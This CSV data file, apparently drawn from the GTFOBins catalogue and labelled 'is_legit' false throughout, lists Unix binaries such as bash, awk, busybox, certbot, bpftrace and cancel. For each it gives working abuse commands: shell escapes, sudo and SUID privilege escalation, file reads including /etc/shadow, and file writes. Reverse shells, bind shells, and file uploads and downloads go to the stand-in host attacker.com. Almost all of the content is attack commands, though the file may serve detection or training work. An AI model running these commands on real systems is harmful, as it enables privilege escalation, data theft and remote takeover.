"Name","functions","functions_shell","functions_shell_description","functions_shell_code","functions_sudo","functions_sudo_description","functions_sudo_code","description","functions_file-read","functions_file-read_code","functions_suid","functions_suid_code","functions_file-write","functions_file-write_code","functions_limited-suid","functions_limited-suid_code","functions_file-download","functions_file-download_description","functions_file-download_code","functions_file-read_description","functions_suid_description","functions_non-interactive-reverse-shell","functions_non-interactive-reverse-shell_description","functions_non-interactive-reverse-shell_code","functions_command","functions_command_description","functions_command_code","functions_file-upload","functions_file-upload_description","functions_file-upload_code","functions_file-write_description","functions_reverse-shell","functions_reverse-shell_description","functions_reverse-shell_code","functions_non-interactive-bind-shell","functions_non-interactive-bind-shell_description","functions_non-interactive-bind-shell_code","functions_library-load","functions_library-load_description","functions_library-load_code","functions_capabilities","functions_capabilities_description","functions_capabilities_code","functions_limited-suid_description","functions_bind-shell","functions_bind-shell_description","functions_bind-shell_code","is_legit"
"check_by_ssh","","The shell will only last 10 seconds.","check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","","The shell will only last 10 seconds.","sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx","This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.  When `check_by_ssh` version `2.4.5` (2023-05-31) or later from the Nagios Plugins project in it's default configuration is used, it does not work anymore.  It does still work on previous versions from the Nagios Plugins project or all versions from the Monitoring Project (e.g. used by Ubuntu/Debian).","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"certbot","","","TF=$(mktemp -d) certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'","","","TF=$(mktemp -d) sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cdist","","","cdist shell -s /bin/sh","","","sudo cdist shell -s /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cat","","","","","","LFILE=file_to_read sudo cat ""$LFILE""","","","LFILE=file_to_read cat ""$LFILE""","","LFILE=file_to_read ./cat ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"capsh","","","capsh --","","","sudo capsh --","","","","","./capsh --gid=0 --uid=0 --","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cancel","","","","","","","","","","","","","","","","","","","","","","","","","","","","Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send cancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT","","","","","","","","","","","","","","","","","","false"
"cabal","","","cabal exec -- /bin/sh","","","sudo cabal exec -- /bin/sh","","","","","./cabal exec -- /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"c99","","","c99 -wrapper /bin/sh,-s .","","","sudo c99 -wrapper /bin/sh,-s .","","","LFILE=file_to_read c99 -x c -E ""$LFILE""","","","","LFILE=file_to_delete c99 -xc /dev/null -o $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"c89","","","c89 -wrapper /bin/sh,-s .","","","sudo c89 -wrapper /bin/sh,-s .","","","LFILE=file_to_read c89 -x c -E ""$LFILE""","","","","LFILE=file_to_delete c89 -xc /dev/null -o $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bzip2","","","","","","LFILE=file_to_read sudo bzip2 -c $LFILE | bzip2 -d","There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.","","LFILE=file_to_read bzip2 -c $LFILE | bzip2 -d","","LFILE=file_to_read ./bzip2 -c $LFILE | bzip2 -d","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"byebug","","","TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF byebug $TF continue","","","TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF sudo byebug $TF continue","","","","","","","","","TF=$(mktemp) echo 'system(""/bin/sh"")' > $TF ./byebug $TF continue","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"busybox","","","busybox sh","","","sudo busybox sh","BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example.","","LFILE=file_to_read ./busybox cat ""$LFILE""","","./busybox sh","","LFILE=file_to_write busybox sh -c 'echo ""DATA"" > $LFILE'","","","","","","","It may drop the SUID privileges depending on the compilation flags and the runtime configuration.","","","","","","","","Serve files in the local folder running an HTTP server.","LPORT=12345 busybox httpd -f -p $LPORT -h .","","","Run `nc -lvp 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 busybox nc -e /bin/sh $RHOST $RPORT","","","","","","","","","","","","","","false"
"busctl","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","[''busctl --show-machine !/bin/sh ''-|-''busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2' '']","","","sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'","","","","","./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bundler","","[''This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.''-|-''This spawns an interactive shell via [`irb`](/gtfobins/irb/).'']","[''bundler help !/bin/sh ''-|-''export BUNDLE_GEMFILE=x bundler exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundler exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundler console system('/bin/sh -c /bin/sh') ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/Gemfile cd $TF bundler install '']","","This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.","sudo bundler help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bundle","","[''This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.''-|-''This spawns an interactive shell via [`irb`](/gtfobins/irb/).'']","[''bundle help !/bin/sh ''-|-''export BUNDLE_GEMFILE=x bundle exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundle exec /bin/sh ''-|-''TF=$(mktemp -d) touch $TF/Gemfile cd $TF bundle console system('/bin/sh -c /bin/sh') ''-|-''TF=$(mktemp -d) echo 'system(""/bin/sh"")' > $TF/Gemfile cd $TF bundle install '']","","This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.","sudo bundle help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bridge","","","","","","LFILE=file_to_read sudo bridge -b ""$LFILE""","Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.","","LFILE=file_to_read bridge -b ""$LFILE""","","LFILE=file_to_read ./bridge -b ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bpftrace","","","","","","[''sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'''-|-''TF=$(mktemp) echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF sudo bpftrace $TF ''-|-''sudo bpftrace -c /bin/sh -e 'END {exit()}''']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bconsole","","","bconsole @exec /bin/sh","","","sudo bconsole @exec /bin/sh","","","bconsole -c /etc/shadow","","","","","","","","","","The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bc","","","","","","LFILE=file_to_read sudo bc -s $LFILE quit","The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.","","LFILE=file_to_read bc -s $LFILE quit","","LFILE=file_to_read ./bc -s $LFILE quit","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"batcat","","","batcat --paging always /etc/profile !/bin/sh","","","sudo batcat --paging always /etc/profile !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply. `--paging always` can be omitted provided that the output doesn't fit the screen.","","","","","","","","./batcat --paging always /etc/profile !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"bash","","","bash","","","sudo bash","","","[''export LFILE=file_to_read bash -c 'echo ""$(<$LFILE)""' ''-|-''LFILE=file_to_read HISTTIMEFORMAT=$'\r\e[K' history -r $LFILE history '']","","./bash -p","","[''export LFILE=file_to_write bash -c 'echo DATA > $LFILE' ''-|-''LFILE=file_to_write HISTIGNORE='history *' history -c DATA history -w $LFILE '']","","","","[''Fetch a remote file via HTTP GET request.''-|-''Fetch remote file using a TCP connection. Run `nc -l -p 12345 < ""file_to_send""` on the attacker box to send the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \     3<>/dev/tcp/$RHOST/$RPORT \     | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_get bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE' '']","[''It trims trailing newlines and it's not binary-safe.''-|-''The read file content is surrounded by the current history content.'']","","","","","","","","","[''Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Send local file using a TCP connection. Run `nc -l -p 12345 > ""file_to_save""` on the attacker box to collect the file.'']","[''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT' ''-|-''export RHOST=attacker.com export RPORT=12345 export LFILE=file_to_send bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT' '']","This adds timestamps to the output file.","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'","","","","","","bash -c 'enable -f ./lib.so x'","","","","","","","","false"
"basez","","","","","","LFILE=file_to_read sudo basez ""$LFILE"" | basez --decode","","","LFILE=file_to_read basez ""$LFILE"" | basez --decode","","LFILE=file_to_read ./basez ""$LFILE"" | basez --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"basenc","","","","","","LFILE=file_to_read sudo basenc --base64 $LFILE | basenc -d --base64","","","LFILE=file_to_read basenc --base64 $LFILE | basenc -d --base64","","LFILE=file_to_read basenc --base64 $LFILE | basenc -d --base64","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"base64","","","","","","LFILE=file_to_read sudo base64 ""$LFILE"" | base64 --decode","","","LFILE=file_to_read base64 ""$LFILE"" | base64 --decode","","LFILE=file_to_read ./base64 ""$LFILE"" | base64 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"base58","","","","","","LFILE=file_to_read sudo base58 ""$LFILE"" | base58 --decode","","","LFILE=file_to_read base58 ""$LFILE"" | base58 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"base32","","","","","","LFILE=file_to_read sudo base32 ""$LFILE"" | base32 --decode","","","LFILE=file_to_read base32 ""$LFILE"" | base32 --decode","","LFILE=file_to_read base32 ""$LFILE"" | base32 --decode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"aws","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","aws help !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo aws help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"awk","","","awk 'BEGIN {system(""/bin/sh"")}'","","","sudo awk 'BEGIN {system(""/bin/sh"")}'","","","LFILE=file_to_read awk '//' ""$LFILE""","","LFILE=file_to_read ./awk '//' ""$LFILE""","","LFILE=file_to_write awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","","./awk 'BEGIN {system(""/bin/sh"")}'","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {     s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","LPORT=12345 awk -v LPORT=$LPORT 'BEGIN {     s = ""/inet/tcp/"" LPORT ""/0/0"";     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","false"
"atobm","","","","","","LFILE=file_to_read sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`.","","LFILE=file_to_read atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","","LFILE=file_to_read ./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"at","","","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null","","","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null","","","","","","","","","","","","","","","","","","","The invocation will be blind, but it is possible to redirect the output to a file in a readable location.","COMMAND=id echo ""$COMMAND"" | at now","","","","","","","","","","","","","","","","","","","","","false"
